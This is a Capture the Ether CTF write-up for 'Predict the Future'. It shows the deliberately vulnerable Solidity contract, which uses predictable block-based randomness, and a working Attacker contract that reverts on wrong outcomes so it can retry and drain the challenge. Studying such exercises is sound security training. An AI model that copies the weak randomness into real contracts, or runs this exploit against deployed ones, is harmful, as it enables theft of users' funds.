This time, you have to lock in your guess before the random number is generated. To give you a sporting chance, there are only ten possible answers.

Note that it is indeed possible to solve this challenge without losing any ether.

```solidity
pragma solidity ^0.4.21;

// 0xd9aD89E42a9b19b499cD0D63F7Ec76a5b708E43B
contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
```







solution

https://coinsbench.com/capture-the-ether-predict-the-future-cb5acf12a8cb

```solidity
pragma solidity ^0.8.0;

interface PredictTheFutureChallenge {
    function isComplete() external view returns (bool) ;

    function lockInGuess(uint8 n) external payable ;

    function settle() external ;
}

// 0x9c6c2E60295b8BA499C19FA6cDdCeDA5A9E09Db4
contract Attacker {
    address public owner;
    PredictTheFutureChallenge public victim;

    constructor(address _addr) {
        owner = msg.sender;
        victim = PredictTheFutureChallenge(_addr);
    }

    function lockNum(uint8 n) external payable{
        require(n >= 0 && n <=9, "Number must be in the 0-9 range");

        victim.lockInGuess{value: 1 ether}(n);
    }

    function attack() external payable{
        victim.settle();
        require(victim.isComplete(), "Wrong answer");
    }

    function withdraw() external {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}
```





